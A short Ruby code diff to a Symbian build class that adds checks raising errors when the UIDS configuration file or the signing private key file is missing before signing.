@@ -50,6 +50,8 @@ class BuildSymbian < Build
   def sign(params)
     trace :debug, "Build: signing: #{params}"
 
+    raise "Cannot find UIDS file" unless File.exist? Config.instance.cert("symbian.yaml")
+
     yaml = File.open(Config.instance.cert("symbian.yaml"), 'rb') {|f| f.read}
     uids = YAML.load(yaml)
 
@@ -107,6 +109,9 @@ class BuildSymbian < Build
     
     # this file is provided by the console
     FileUtils.mv(Config.instance.temp(params['cert']), path('symbian.cer'))
+
+    raise "Cannot find private key file" unless File.exist? Config.instance.cert('symbian.key')
+
     # this is global
     FileUtils.cp(Config.instance.cert('symbian.key'), @tmpdir)
 
